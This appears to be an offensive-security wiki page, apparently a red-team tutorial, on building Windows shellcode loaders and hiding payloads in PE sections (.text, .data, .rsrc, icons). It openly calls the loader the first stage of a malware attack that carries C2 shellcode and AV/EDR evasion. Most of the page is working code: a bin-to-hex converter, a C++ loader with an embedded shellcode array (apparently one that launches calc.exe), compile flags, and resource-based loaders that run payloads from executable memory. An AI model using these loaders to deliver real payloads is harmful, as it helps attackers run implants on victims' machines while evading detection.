# ðŸ”§ Shellcode Placement

## <mark style="color:red;">Shellcode Loaders / Wrappers</mark>

As the name suggests, a loader is a program that loads a specific payload in memory ( could be its own memory or memory of another process, A.K.A: code injection). this payload is usually a C2 agent shellcode in an encrypted / encoded format which gets decrypted / decoded before being loaded into memory. so basically a loader is just a wrapper that has the main purpose of delivering the actual malware, its also a template for implementing various AV/EDR evasion checks and techniques since its the first stage of a malware attack and will touch the disk and leave some artifacts before and after execution.&#x20;

### <mark style="color:orange;">Vanilla  C++ Shellcode Runner</mark>

here is an example of a simple python script that converts a binary file to hex  (shellcode) format wich is then used by a shellcode loader. the binary file can be a raw shellcode format generated by a C2 framework:&#x20;

{% code title="bin2shell.py" %}
```python
import sys

def read_binary_file(file_path):
    with open(file_path, 'rb') as f:
        binary_data = f.read()
    return binary_data

def print_shellcode(shellcode):
    for byte in shellcode:
        print("0x{:02X},".format(byte), end='')

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 bin_to_shellcode.py <file_path>")
        return
    
    file_path = sys.argv[1]
    shellcode = read_binary_file(file_path)
    print_shellcode(shellcode)

if __name__ == '__main__':
    main()
```
{% endcode %}

{% hint style="warning" %}
The output includes some null bytes (string terminator character) that would break the execution, these are omitted by the C++ loader code.
{% endhint %}

and here is the code for the C++ vanilla shellcode loader:

{% code title="vanilla-loader.cpp" %}
```cpp
#include <stdio.h>
#include <string.h>
#include <windows.h>

const unsigned char shellcode[] = {
0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,0x8B,0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x48,0xBA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8D,0x8D,0x01,0x01,0x00,0x00,0x41,0xBA,0x31,0x8B,0x6F,0x87,0xFF,0xD5,0xBB,0xF0,0xB5,0xA2,0x56,0x41,0xBA,0xA6,0x95,0xBD,0x9D,0xFF,0xD5,0x48,0x83,0xC4,0x28,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,0x05,0xBB,0x47,0x13,0x72,0x6F,0x6A,0x00,0x59,0x41,0x89,0xDA,0xFF,0xD5,0x63,0x61,0x6C,0x63,0x2E,0x65,0x78,0x65,0x00
};

int main() {
    // Allocate memory for shellcode in current process address space
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("Failed to allocate memory.\n");
        return 1;
    }

    // Copy shellcode to allocated memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Execute the shellcode
    // declares a function pointer named exec_mem (takes no args and has no return)
    // casts exec_mem to a void function pointer type
    // calls the function that exec_mem points to
    ((void (*)())exec_mem)();

    // Free the allocated memory
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}

```
{% endcode %}

by running the python script and placing the shellcode into the "shellcode" array we can use MSVC compiler to compile the code:



{% code title="compile.bat" %}
```c
// @ECHO OFF
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcshell-runner.cpp /link /OUT:shell-runner.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```
{% endcode %}

{% hint style="info" %}
you can use VisualStudio and create a new C++ project and simply click "build" if you dont want to use the build tools directly.
{% endhint %}

`((void (*)())exec_mem)();` casts the memory address stored in `exec_mem` as a function pointer to a function with a return type of `void` and no parameters, and then immediately calls that function.

In the context of a shellcode runner, this is used to execute the shellcode stored in the allocated memory. The memory containing the shellcode is treated as if it were a function, and by calling it as a function, the shellcode's instructions are executed.



***

## <mark style="color:red;">Shellcode Placement</mark>

PE (Portable Executable) file format has many sections and some of them can be used for storing our shellcode.&#x20;

{% embed url="https://medium.com/ax1al/a-brief-introduction-to-pe-format-6052914cc8dd" %}

### <mark style="color:orange;">.TEXT Section</mark>

&#x20;in the context of the C shellcode runner provided earlier, where the shellcode is defined inside the `main` function, the shellcode is indeed stored in the `.text` section of the PE executable. The `.text` section is typically used to store executable code. to put your payload in .text section, simply define the shellcode array inside one of the functions defined in the program.

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// .text section is the body of any function declearation
int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// 4 byte payload
	// placed in PE .text section
	unsigned char payload[] = {
	0x90,		// NOP
	0x90,		// NOP
	0xcc,		// INT3
	0xc3		// RET
	};


	unsigned int payload_len = 4;
	
	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```

### <mark style="color:orange;">**.DATA Section**</mark>

if the payload is declared outside of all functions it will be saved in the data section. this section is used for global and predefined variables in the program.

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 4 byte payload
// declared outside all functions so its included in the PE .data section 
unsigned char payload[] = {
	0x90,		// NOP
	0x90,		// NOP
	0xcc,		// INT3
	0xc3		// RET
};
unsigned int payload_len = 4;


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

### <mark style="color:orange;">**.RSRC Section**</mark>

the `.rsrc` section refers to the resource section. this section stores various types of resources that an executable or DLL file might need at runtime, such as icons, bitmaps, strings, dialogs, version information, and more.

to store the payload in resources section, we have to add our custom resource file to the VS project:



Right click on the `Resource Files` in Solution Explorer and select `Add > Resource:`

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Click `Import` and select the resource you want to include. In my case - it's the `resource.bin`:

Give resource a resource type name - anything works, but you need to remember it when calling `FindResource` API call (shown later in the code):

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

If you compile your program now and inspect it with resource hacker, you can now see the shellcode you have just embedded as a PE resource.

We can then leverage a small set of self-explanatory Windows APIs to find the embedded resource, load it into memory and execute it like so:



```cpp
#include <iostream>
#include <Windows.h>
#include "resource.h"

int main()
{
	// IDR_RESOURCE_BIN1 - is the resource ID - which contains ths shellcode
	// RESOURCE_BIN is the resource type name we chose earlier when embedding the resource.bin
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RESOURCE_BIN1), L"RESOURCE_BIN");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);

	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResouceData, shellcodeSize);
	((void(*)())exec)();

	return  0;
}
```

### <mark style="color:orange;">ICON Images</mark>

icons are stored in the resources section of the PE file. since icons include images and images can have different entropy (very high and very low), this is a good place for hiding our shellcode.

here is an interesting blog post on this topic:

{% embed url="https://morph3.blog/posts/Exotic-ways-of-hiding-shellcode-Part-1-Icons" %}

the PoC is on github, you may need to change it to match your shellcode size and your color of choice:

{% embed url="https://github.com/morph3/gizligizli/" %}

